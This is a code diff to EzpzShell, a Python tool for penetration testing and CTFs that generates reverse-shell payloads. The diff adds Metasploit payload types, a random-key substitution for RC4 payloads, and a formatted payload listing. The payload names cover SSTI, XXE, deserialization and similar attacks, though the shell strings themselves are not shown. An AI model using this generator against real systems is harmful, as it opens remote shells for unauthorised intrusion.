@@ -9,7 +9,7 @@
 #Github Link    : https://github.com/H0j3n/EzpzShell
 ######################################################################
 
-import sys,re,os,base64,pickle
+import sys,re,os,base64,pickle,string,random
 import netifaces as ni
 from netifaces import AF_INET, AF_INET6, AF_LINK, AF_PACKET, AF_BRIDGE
 
@@ -25,7 +25,7 @@ class colors:
     ORANGE = '\033[1;33;40m'
 
 def header():
-	listPayload = ','.join([i for i in payload.keys()])
+	listPayload = ','.join([i for i in sorted(payload.keys())])
 	print('''
   ______               _____ _          _ _
  |  ____|             / ____| |        | | |
@@ -35,8 +35,17 @@ def header():
  |______/___| .__/___|_____/|_| |_|\___|_|_|
             | |
             |_|'''+f'''\n\n{colors.CYAN}[Payload Available]
-{colors.RESET}'''+listPayload+f'''{colors.CYAN}
-\n[Usage]\n{colors.ORANGE}python3 {sys.argv[0]} 10.10.10.10 9001 py\n{colors.ORANGE}python3 {sys.argv[0]} tun0 9001 py{colors.RESET}''')
+{colors.RESET}''')
+	# Payload Listing
+	counter = 0
+	for i in listPayload.split(","):
+		print(f"{colors.GREEN}[{colors.RESET}"+i+f"{colors.GREEN}]{colors.RESET}",end=" ")
+		counter += 1
+		if counter == 10:
+			counter = 0
+			print()
+	print(f'''{colors.CYAN}
+\n[Usage]\n{colors.ORANGE}\npython3 {sys.argv[0]} 10.10.10.10 9001 py\n{colors.ORANGE}python3 {sys.argv[0]} tun0 9001 py{colors.RESET}''')
 
 def load_shell():
 	listShell = open("/opt/Tools/EzpzShell/shell.txt").read()
@@ -96,6 +105,12 @@ def char_encode(payload):
 	for char in payload:
 		encoded_payload = encoded_payload + "," + str(ord(char))
 	return encoded_payload[1:]
+	
+def get_random_string():
+	# choose from all lowercase letter
+	letters = string.ascii_lowercase + string.ascii_uppercase + string.digits
+	result_str = ''.join(random.choice(letters) for i in range(20))
+	return result_str
 
 payload = {
 	"py":[],
@@ -111,7 +126,7 @@ payload = {
 	"node":[],
 	"awk":[],
 	"ncat":[],
-	"exe":[],
+	"msf_exe":[],
 	"ssti":[],
 	"cgibin":[],
 	"jenkins":[],
@@ -123,11 +138,14 @@ payload = {
 	"xxe": [],
 	"jsp":[],
 	"c#":[],
-    "xsl":[],
-    "yaml":[],
-    "sql":[],
-    "wordpress":[],
-    "json.net":[]
+        "xsl":[],
+        "yaml":[],
+        "sql":[],
+        "wordpress":[],
+        "json.net":[],
+        "msf_raw":[],
+        "msf_dll":[],
+        "msf_elf":[]
 }
 
 if __name__ == "__main__":
@@ -175,6 +193,9 @@ if __name__ == "__main__":
 		elif "{PHPEMOJI}" in j:
 			new_ip,new_port = phpemoji(ip,port)
 			print(j.strip().replace("{PHPEMOJI}","").replace("{IP}",new_ip).replace("{PORT}",new_port).strip())
+		elif "{RC4RANDOM}" in j:
+			temprandom = get_random_string()
+			print(j.strip().replace("{RC4RANDOM}",temprandom).replace("{IP}",ip).replace("{PORT}",port).strip())
 		elif "{NODEJS_DESERIALIZATION}" in j:
 			temp = j.strip().replace("{NODEJS_DESERIALIZATION}","").replace("{IP}",ip).replace("{PORT}",port).strip()
 			temp2 = char_encode(temp)
